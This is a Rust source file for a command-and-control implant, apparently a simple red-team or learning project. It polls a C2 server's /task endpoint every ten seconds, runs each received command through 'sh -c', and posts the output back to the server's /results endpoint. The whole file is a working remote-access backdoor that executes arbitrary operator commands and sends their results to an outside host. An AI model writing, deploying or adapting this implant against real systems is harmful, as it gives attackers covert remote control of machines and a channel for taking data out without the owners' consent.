use std::{env, process::Command, thread, time::Duration};
use reqwest::Client;
use serde::{Deserialize, Serialize};
use tokio;

#[derive(Deserialize)]
struct Task {
    cmd: String,
}

#[derive(Serialize)]
struct ResultPayload {
    output: String,
}

#[tokio::main]
async fn main() {
    // get url and port number from args
    let args: Vec<String> = env::args().collect();
    if args.len() != 2 {
        eprint!("Error -> Arguments: {} <c2_url>", args[0]);
        std::process::exit(1);
    }

    println!("c2 URL is: {}", args[1]);

    let c2_url = &args[1];
    let client = Client::new();

    loop{
        let task_url = format!("{}/task", c2_url);
        let result_url = format!("{}/results", c2_url);

        println!("{}", task_url);
        println!("{}", result_url);

        match client.get(&task_url).send().await {
            Ok(resp) => {
                if let Ok(task) = resp.json::<Task>().await {
                    println!("[*] Received command: {}", task.cmd);

                    let output = Command::new("sh")
                        .arg("-c")
                        .arg(&task.cmd)
                        .output();
                
                    let result = match output {
                        Ok(o) => {
                            let stdout = String::from_utf8_lossy(&o.stdout);
                            stdout.to_string()
                        }
                        Err(e) => format!("Error executing command: {}", e),
                    };
                    println!("Result: {}", result);

                    let payload = ResultPayload { output: result };
                    let res = client.post(&result_url)
                        .json(&payload)
                        .send()
                        .await;
                    match res {
                        Ok(_) => println!("[*] Result sent successfully."),
                        Err(e) => eprintln!("[-] Failed to send result: {}", e),
                    }
                }
            }
            Err(e) => {
                eprintln!("[-] Error fetching task: {}", e);
            }
        }
        thread::sleep(Duration::from_secs(10));    
    }
}



